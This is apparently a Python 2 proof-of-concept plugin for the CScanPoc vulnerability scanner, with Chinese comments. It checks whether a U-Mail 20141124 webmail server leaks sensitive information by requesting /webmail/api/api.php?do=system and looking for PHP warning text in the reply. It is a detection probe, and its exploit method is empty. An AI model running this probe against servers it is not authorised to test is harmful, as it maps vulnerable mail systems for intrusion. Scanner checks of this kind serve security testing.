# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re
import hashlib

class Vuln(ABVuln):
    poc_id = 'f1eebec3-89e3-41b3-860d-db34b255eea7'
    name = 'U-Mail 20141124 /api/api.php 敏感信息泄漏' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2014-10-28'  # 漏洞公布时间
    desc = '''
        U-Mail 20141124 /api/api.php 敏感信息泄露。
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=070206' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'U-Mail'  # 漏洞应用名称
    product_version = '20141124'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'abf98d32-dbe2-401b-b597-71de11bdfecd'
    author = '国光'  # POC编写者
    create_date = '2018-05-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/webmail/api/api.php?do=system'
            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if 'Warning' in content and 'system()' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()